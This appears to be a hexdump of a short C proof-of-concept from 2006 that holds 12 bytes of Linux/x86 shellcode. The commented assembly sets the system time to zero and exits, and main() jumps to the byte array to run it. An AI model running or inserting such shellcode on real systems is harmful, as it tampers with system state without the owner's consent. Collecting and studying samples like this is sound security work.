00000000  2f 2a 20 42 79 20 4b 72  69 73 20 4b 61 74 74 65  |/* By Kris Katte|
00000010  72 6a 6f 68 6e 20 31 31  2f 31 38 2f 32 30 30 36  |rjohn 11/18/2006|
00000020  0d 0a 20 2a 0d 0a 20 2a  20 31 32 20 62 79 74 65  |.. *.. * 12 byte|
00000030  20 73 68 65 6c 6c 63 6f  64 65 20 74 6f 20 73 65  | shellcode to se|
00000040  74 20 73 79 73 74 65 6d  20 74 69 6d 65 20 74 6f  |t system time to|
00000050  20 30 20 61 6e 64 20 65  78 69 74 2e 20 4e 6f 20  | 0 and exit. No |
00000060  72 65 61 6c 20 64 61 6d  61 67 65 20 3a 29 0d 0a  |real damage :)..|
00000070  20 2a 0d 0a 20 2a 20 65  78 69 74 28 29 20 63 6f  | *.. * exit() co|
00000080  64 65 20 69 73 20 74 68  65 20 6c 61 73 74 20 35  |de is the last 5|
00000090  20 62 79 74 65 73 20 28  30 78 36 61 20 2d 20 30  | bytes (0x6a - 0|
000000a0  78 38 30 29 0d 0a 20 2a  0d 0a 20 2a 20 66 6f 72  |x80).. *.. * for|
000000b0  20 4c 69 6e 75 78 2f 78  38 36 0d 0a 20 2a 0d 0a  | Linux/x86.. *..|
000000c0  20 2a 0d 0a 20 2a 0d 0a  20 2a 20 73 65 63 74 69  | *.. *.. * secti|
000000d0  6f 6e 20 2e 74 65 78 74  0d 0a 20 2a 0d 0a 20 2a  |on .text.. *.. *|
000000e0  20 20 20 20 20 20 67 6c  6f 62 61 6c 20 5f 73 74  |      global _st|
000000f0  61 72 74 0d 0a 20 2a 0d  0a 20 2a 20 5f 73 74 61  |art.. *.. * _sta|
00000100  72 74 3a 0d 0a 20 2a 0d  0a 20 2a 20 3b 20 73 74  |rt:.. *.. * ; st|
00000110  69 6d 65 28 5b 30 5d 29  0d 0a 20 2a 0d 0a 20 2a  |ime([0]).. *.. *|
00000120  20 20 20 20 20 20 70 75  73 68 20 62 79 74 65 20  |      push byte |
00000130  32 35 0d 0a 20 2a 20 20  20 20 20 20 70 6f 70 20  |25.. *      pop |
00000140  65 61 78 0d 0a 20 2a 20  20 20 20 20 20 63 64 71  |eax.. *      cdq|
00000150  0d 0a 20 2a 20 20 20 20  20 20 70 75 73 68 20 65  |.. *      push e|
00000160  64 78 0d 0a 20 2a 20 20  20 20 20 20 6d 6f 76 20  |dx.. *      mov |
00000170  65 62 78 2c 20 65 73 70  0d 0a 20 2a 20 20 20 20  |ebx, esp.. *    |
00000180  20 20 69 6e 74 20 30 78  38 30 0d 0a 20 2a 0d 0a  |  int 0x80.. *..|
00000190  20 2a 20 3b 20 65 78 69  74 28 29 0d 0a 20 2a 0d  | * ; exit().. *.|
000001a0  0a 20 2a 20 20 20 20 20  20 69 6e 63 20 65 61 78  |. *      inc eax|
000001b0  0d 0a 20 2a 20 20 20 20  20 20 69 6e 74 20 30 78  |.. *      int 0x|
000001c0  38 30 0d 0a 20 2a 2f 0d  0a 0d 0a 6d 61 69 6e 28  |80.. */....main(|
000001d0  29 0d 0a 7b 0d 0a 20 20  20 20 20 20 20 63 68 61  |)..{..       cha|
000001e0  72 20 73 68 65 6c 6c 63  6f 64 65 5b 5d 20 3d 20  |r shellcode[] = |
000001f0  22 5c 78 36 61 5c 78 31  39 5c 78 35 38 5c 78 39  |"\x6a\x19\x58\x9|
00000200  39 5c 78 35 32 5c 78 38  39 5c 78 65 33 5c 78 63  |9\x52\x89\xe3\xc|
00000210  64 5c 78 38 30 5c 78 34  30 5c 78 63 64 5c 78 38  |d\x80\x40\xcd\x8|
00000220  30 22 3b 0d 0a 0d 0a 20  20 20 20 20 20 20 28 2a  |0";....       (*|
00000230  28 76 6f 69 64 20 28 2a  29 28 29 29 20 73 68 65  |(void (*)()) she|
00000240  6c 6c 63 6f 64 65 29 28  29 3b 0d 0a 7d           |llcode)();..}|
0000024d
